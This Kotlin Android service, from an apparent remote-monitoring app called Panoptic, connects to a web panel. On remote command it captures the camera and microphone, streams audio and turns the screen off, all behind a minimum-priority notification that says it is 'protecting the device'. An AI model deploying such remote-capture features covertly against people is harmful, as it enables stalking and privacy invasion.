package com.juanrbcode.panoptic.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.juanrbcode.panoptic.Controller.AudioController
import com.juanrbcode.panoptic.Controller.CameraController
import com.juanrbcode.panoptic.Controller.ScreenController
import com.juanrbcode.panoptic.R
import com.juanrbcode.panoptic.data.SocketManager

class ConnectionService : Service(), LifecycleOwner {

    private lateinit var screenController: ScreenController
    private lateinit var socketManager: SocketManager
    private lateinit var cameraController: CameraController
    private lateinit var audioController: AudioController
    private lateinit var networkMonitor: NetworkMonitor

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private val CHANNEL_ID = "PanopticServiceChannel"

    companion object {
        const val ACTION_AUTH_SUCCESS = "com.juanrbcode.panoptic.ACTION_AUTH_SUCCESS"
        const val ACTION_AUTH_ERROR = "com.juanrbcode.panoptic.ACTION_AUTH_ERROR"
        const val EXTRA_ERROR_MSG = "extra_error_msg"

        private var isServiceRunning = false
    }

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        createNotificationChannel()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Panoptic en segundo plano")
            .setContentText("Protegiendo el dispositivo...")
            .setSmallIcon(R.mipmap.ic_launcher_round)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        startForeground(1, notification)

        if (isServiceRunning) {
            Log.d("ConnectionService", "El servicio ya está activo. Ignorando comando duplicado.")
            return START_STICKY
        }

        val serverUrl = intent?.getStringExtra("SERVER_URL")
        val roomCode = intent?.getStringExtra("ROOM_CODE")
        val password = intent?.getStringExtra("PASSWORD")

        if (!serverUrl.isNullOrEmpty() && !roomCode.isNullOrEmpty() && !password.isNullOrEmpty()) {
            isServiceRunning = true
            Log.d("ConnectionService", "Inicializando controladores y conexión única...")

            socketManager = SocketManager(this, serverUrl)
            cameraController = CameraController(this, socketManager)
            audioController = AudioController(this, socketManager)
            screenController = ScreenController(this)

            initSocketConnection(roomCode, password)

            networkMonitor = NetworkMonitor(this) {
                Log.d("ConnectionService", "Red recuperada, reintentando conexión...")
                initSocketConnection(roomCode, password)
            }
            networkMonitor.start()
        } else {
            Log.e("ConnectionService", "Error: Datos de conexión incompletos. Parando servicio.")
            stopSelf()
        }

        return START_STICKY
    }

    private fun initSocketConnection(roomCode: String, password: String) {

        // ESCUCHA DEL AUDIO ENTRANTE DESDE LA PC (Voz bidireccional)
        socketManager.onPlayAudioChunk { base64Chunk ->
            audioController.playAudioChunk(base64Chunk)
        }

        socketManager.connect(
            roomCode = roomCode,
            password = password,
            onConnected = {
                Log.d("ConnectionService", "Socket conectado al servidor. Autenticando sala...")
            },
            onAuthSuccess = {
                Log.d("ConnectionService", "¡AUTENTICACIÓN EXITOSA en sala: $roomCode!")
                val intent = Intent(ACTION_AUTH_SUCCESS)
                LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
            },
            onAuthError = { errorMsg ->
                Log.e("ConnectionService", "¡ERROR DE AUTENTICACIÓN!: $errorMsg")
                val intent = Intent(ACTION_AUTH_ERROR)
                intent.putExtra(EXTRA_ERROR_MSG, errorMsg)
                LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
                socketManager.disconnect()
            },
            onDisconnected = {
                Log.d("ConnectionService", "Socket desconectado del servidor.")
            },
            onCommandReceived = { action, data ->
                Log.d("ConnectionService", "Comando recibido del panel: $action con data: $data")

                when (action) {
                    "start_camera" -> {
                        val lens = data?.optString("lens", "back") ?: "back"
                        cameraController.startCamera(lens)
                    }
                    "stop_camera" -> {
                        cameraController.stopCamera()
                    }
                    "take_photo" -> {
                        val lens = data?.optString("lens", "back") ?: "back"
                        cameraController.takePhoto(lens)
                    }
                    "start_mic" -> {
                        audioController.startAudioCapture()
                    }
                    "stop_mic" -> {
                        audioController.stopAudioCapture()
                    }
                    "turn_off_screen" -> {
                        screenController.turnOffScreen()
                    }
                    "turn_on_screen" -> {
                        screenController.turnOnScreen()
                    }
                    "start_talking" -> {
                        audioController.startPlayingIncomingAudio()
                    }
                    "stop_talking" -> {
                        audioController.stopPlayingIncomingAudio()
                    }
                    else -> {
                        Log.w("ConnectionService", "Acción no reconocida o no implementada: $action")
                    }
                }
            }
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        Log.d("ConnectionService", "Servicio destruido.")
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)

        try {
            if (::networkMonitor.isInitialized) networkMonitor.stop()
            if (::socketManager.isInitialized) socketManager.disconnect()
            if (::audioController.isInitialized) {
                audioController.stopAudioCapture()
                audioController.stopPlayingIncomingAudio()
            }
            if (::cameraController.isInitialized) cameraController.stopCamera()
        } catch (e: Exception) {
            Log.e("ConnectionService", "Error durante onDestroy: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Panoptic Background Service"
            val descriptionText = "Mantiene la conexión del dispositivo con el panel web"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
                setShowBadge(false)
            }
            val notificationManager: NotificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
}